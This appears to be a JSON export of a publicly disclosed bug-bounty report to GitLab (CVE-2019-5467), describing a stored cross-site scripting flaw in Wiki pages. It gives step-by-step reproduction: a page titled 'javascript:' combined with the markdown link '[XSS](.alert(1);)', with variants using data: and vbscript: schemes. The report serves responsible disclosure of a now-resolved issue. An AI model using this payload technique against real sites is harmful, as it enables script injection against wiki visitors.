{"id":526325,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjYzMjU=","url":"https://hackerone.com/reports/526325","title":"Stored XSS in Wiki pages","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-04-04T12:14:14.275Z","submitted_at":"2019-04-04T12:14:14.275Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ryhmnlfj","url":"/ryhmnlfj","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-5467"],"singular_disclosure_disabled":true,"disclosed_at":"2019-09-02T11:30:07.764Z","bug_reporter_agreed_on_going_public_at":"2019-09-02T11:30:07.676Z","team_member_agreed_on_going_public_at":"2019-08-30T22:36:05.983Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nI found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages.\n\n### Steps to reproduce\n\n1. Sign in to GitLab.\n2. Open a Project page that you have permission to edit Wiki pages.\n3. Open Wiki page.\n4. Click \"New page\" button.\n5. Fill out \"Page slug\" form with `javascript:`.\n6. Click \"Create page\" button.\n7. Fill out the each form as follows:    \nTitle: `javascript:`    \nFormat: Markdown    \nContent: `[XSS](.alert(1);)`    \n(Please see \"CreatePage.png\")    \n{F462086}    \n8. Click \"Create page\" button.\n9. Click \"XSS\" link in created page.\n\n### What is the current *bug* behavior?\n\nThe alert dialog appears after clicking \"XSS\" link in created page.\nPlease see \"Result_Firefox.png\".\n{F462087}\n\n#### Description In Detail:\n\nGitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.\nFurthermore, Wiki-specific Markdown string `.` is converted to `javascript:` in this case.\n\n### What is the expected *correct* behavior?\n\nThe dangerous href attribute `javascript:alert(1);` should be filtered.\nA safe HTTP/HTTPS link should be rendered instead.\n\n### Additional Informations:\n\n1. In the above case, another Wiki-specific Markdown string `..` is also converted to `javascript:`.\n\n2. Using Title string such as `javascript:STRING_EXPECTED_REMOVING` also reproduces this vulnerability.\nFor example, if a wiki page is created with a disguised Title string `JavaScript::SubClassName.function_name`, GitLab application converts Wiki-specific Markdown string `.` to `JavaScript:` in such page.\nIt seems that GitLab application recognizes scheme-like string `JavaScript:` and removes the rest of Title string `:SubClassName.function_name`.\n\n3. An attacker can use various schemes by replacing Title string `javascript:` to other scheme. (e.g. `data:`, `vbscript:`, and so on.)\n\n### Output of checks\n\nThis bug happens on the official Docker installation of GitLab Enterprise Edition 11.9.4-ee.\n\n#### Results of GitLab environment info\n\nOutput of `sudo gitlab-rake gitlab:env:info`:\n\n```\nSystem information\nSystem:\t\t\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.5.3p105\nGem Version:\t2.7.6\nBundler Version:1.16.6\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.18.1\nSidekiq Version:5.2.5\nGo Version:\tunknown\n\nGitLab information\nVersion:\t11.9.4-ee\nRevision:\t55be7f0\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tpostgresql\nDB Version:\t9.6.11\nURL:\t\thttp://gitlab.example.com\nHTTP Clone URL:\thttp://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t8.7.1\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nIf wiki pages created by using this vulnerability are visible to everyone (Wiki Visibility setting is set to \"Everyone With Access\") in \"Public\" project, there is a possibility that a considerable number of GitLab users and visitors click a malicious link.","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eI found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eSign in to GitLab.\u003c/li\u003e\n\u003cli\u003eOpen a Project page that you have permission to edit Wiki pages.\u003c/li\u003e\n\u003cli\u003eOpen Wiki page.\u003c/li\u003e\n\u003cli\u003eClick \u0026quot;New page\u0026quot; button.\u003c/li\u003e\n\u003cli\u003eFill out \u0026quot;Page slug\u0026quot; form with \u003ccode\u003ejavascript:\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eClick \u0026quot;Create page\u0026quot; button.\u003c/li\u003e\n\u003cli\u003eFill out the each form as follows:\u003cbr\u003e\nTitle: \u003ccode\u003ejavascript:\u003c/code\u003e\u003cbr\u003e\nFormat: Markdown\u003cbr\u003e\nContent: \u003ccode\u003e[XSS](.alert(1);)\u003c/code\u003e\u003cbr\u003e\n(Please see \u0026quot;CreatePage.png\u0026quot;)\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"CreatePage.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/462/086/ca5972f9cb710657a5662225c776f4b935fcf84c/CreatePage.png?response-content-disposition=attachment%3B%20filename%3D%22CreatePage.png%22%3B%20filename%2A%3DUTF-8%27%27CreatePage.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026amp;X-Amz-Signature=e690b28457747e1731e6e53c0d77c52c137a763c347bb4ae203901d7e3ad7324\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/462/086/ca5972f9cb710657a5662225c776f4b935fcf84c/CreatePage.png?response-content-disposition=attachment%3B%20filename%3D%22CreatePage.png%22%3B%20filename%2A%3DUTF-8%27%27CreatePage.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026amp;X-Amz-Signature=e690b28457747e1731e6e53c0d77c52c137a763c347bb4ae203901d7e3ad7324\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\n\u003c/li\u003e\n\u003cli\u003eClick \u0026quot;Create page\u0026quot; button.\u003c/li\u003e\n\u003cli\u003eClick \u0026quot;XSS\u0026quot; link in created page.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"what-is-the-current-bug-behavior\"\u003eWhat is the current \u003cem\u003ebug\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eThe alert dialog appears after clicking \u0026quot;XSS\u0026quot; link in created page.\u003cbr\u003e\nPlease see \u0026quot;Result_Firefox.png\u0026quot;.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Result_Firefox.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/462/087/9dd57220bbcbe63042309517d194119268f954c0/Result_Firefox.png?response-content-disposition=attachment%3B%20filename%3D%22Result_Firefox.png%22%3B%20filename%2A%3DUTF-8%27%27Result_Firefox.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026amp;X-Amz-Signature=6e86ee6fc8693b95299a58d4e257742ded04e1be2b485b62b10db656f4e0afe1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/462/087/9dd57220bbcbe63042309517d194119268f954c0/Result_Firefox.png?response-content-disposition=attachment%3B%20filename%3D%22Result_Firefox.png%22%3B%20filename%2A%3DUTF-8%27%27Result_Firefox.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026amp;X-Amz-Signature=6e86ee6fc8693b95299a58d4e257742ded04e1be2b485b62b10db656f4e0afe1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch4 id=\"description-in-detail\"\u003eDescription In Detail:\u003c/h4\u003e\n\n\u003cp\u003eGitLab application converts the Markdown string \u003ccode\u003e.alert(1);\u003c/code\u003e to the href attribute \u003ccode\u003ejavascript:alert(1);\u003c/code\u003e.\u003cbr\u003e\nFurthermore, Wiki-specific Markdown string \u003ccode\u003e.\u003c/code\u003e is converted to \u003ccode\u003ejavascript:\u003c/code\u003e in this case.\u003c/p\u003e\n\n\u003ch3 id=\"what-is-the-expected-correct-behavior\"\u003eWhat is the expected \u003cem\u003ecorrect\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eThe dangerous href attribute \u003ccode\u003ejavascript:alert(1);\u003c/code\u003e should be filtered.\u003cbr\u003e\nA safe HTTP/HTTPS link should be rendered instead.\u003c/p\u003e\n\n\u003ch3 id=\"additional-informations\"\u003eAdditional Informations:\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eIn the above case, another Wiki-specific Markdown string \u003ccode\u003e..\u003c/code\u003e is also converted to \u003ccode\u003ejavascript:\u003c/code\u003e.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUsing Title string such as \u003ccode\u003ejavascript:STRING_EXPECTED_REMOVING\u003c/code\u003e also reproduces this vulnerability.\u003cbr\u003e\nFor example, if a wiki page is created with a disguised Title string \u003ccode\u003eJavaScript::SubClassName.function_name\u003c/code\u003e, GitLab application converts Wiki-specific Markdown string \u003ccode\u003e.\u003c/code\u003e to \u003ccode\u003eJavaScript:\u003c/code\u003e in such page.\u003cbr\u003e\nIt seems that GitLab application recognizes scheme-like string \u003ccode\u003eJavaScript:\u003c/code\u003e and removes the rest of Title string \u003ccode\u003e:SubClassName.function_name\u003c/code\u003e.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAn attacker can use various schemes by replacing Title string \u003ccode\u003ejavascript:\u003c/code\u003e to other scheme. (e.g. \u003ccode\u003edata:\u003c/code\u003e, \u003ccode\u003evbscript:\u003c/code\u003e, and so on.)\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"output-of-checks\"\u003eOutput of checks\u003c/h3\u003e\n\n\u003cp\u003eThis bug happens on the official Docker installation of GitLab Enterprise Edition 11.9.4-ee.\u003c/p\u003e\n\n\u003ch4 id=\"results-of-gitlab-environment-info\"\u003eResults of GitLab environment info\u003c/h4\u003e\n\n\u003cp\u003eOutput of \u003ccode\u003esudo gitlab-rake gitlab:env:info\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSystem information\nSystem:     \nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.5.3p105\nGem Version:    2.7.6\nBundler Version:1.16.6\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.18.1\nSidekiq Version:5.2.5\nGo Version: unknown\n\nGitLab information\nVersion:    11.9.4-ee\nRevision:   55be7f0\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: postgresql\nDB Version: 9.6.11\nURL:        http://gitlab.example.com\nHTTP Clone URL: http://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.com:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers: \n\nGitLab Shell\nVersion:    8.7.1\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIf wiki pages created by using this vulnerability are visible to everyone (Wiki Visibility setting is set to \u0026quot;Everyone With Access\u0026quot;) in \u0026quot;Public\u0026quot; project, there is a possibility that a considerable number of GitLab users and visitors click a malicious link.\u003c/p\u003e\n","bounty_amount":"4500.0","formatted_bounty":"$4,500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":462086,"file_name":"CreatePage.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/462/086/ca5972f9cb710657a5662225c776f4b935fcf84c/CreatePage.png?response-content-disposition=attachment%3B%20filename%3D%22CreatePage.png%22%3B%20filename%2A%3DUTF-8%27%27CreatePage.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=e690b28457747e1731e6e53c0d77c52c137a763c347bb4ae203901d7e3ad7324","file_size":45587,"type":"image/png"},{"id":462087,"file_name":"Result_Firefox.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/462/087/9dd57220bbcbe63042309517d194119268f954c0/Result_Firefox.png?response-content-disposition=attachment%3B%20filename%3D%22Result_Firefox.png%22%3B%20filename%2A%3DUTF-8%27%27Result_Firefox.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=6e86ee6fc8693b95299a58d4e257742ded04e1be2b485b62b10db656f4e0afe1","file_size":37457,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":589,"voters":["virenpawar","env","404_hackers","daehee","sat0shi","lyinq","is-","acut3","sky003","xypex","and 579 